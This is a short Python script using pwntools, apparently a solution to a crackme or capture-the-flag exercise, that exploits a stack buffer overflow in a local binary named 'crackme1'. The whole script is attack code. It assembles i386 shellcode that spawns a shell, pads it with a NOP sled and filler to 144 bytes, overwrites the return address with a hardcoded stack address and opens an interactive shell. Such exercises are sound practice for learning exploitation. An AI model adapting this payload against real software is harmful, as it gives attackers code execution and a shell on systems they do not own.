import os
os.environ['PWNLIB_SILENT'] = 'True'  # reduce logging info of pwntools on stdin
from pwn import *


p = process("./crackme1")
context.update(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())

payload =b"\x90"*10 + shellcode + b"A"*(144-len(shellcode)-10) + p32(0xffffcba6)

p.sendline(payload)
p.interactive()
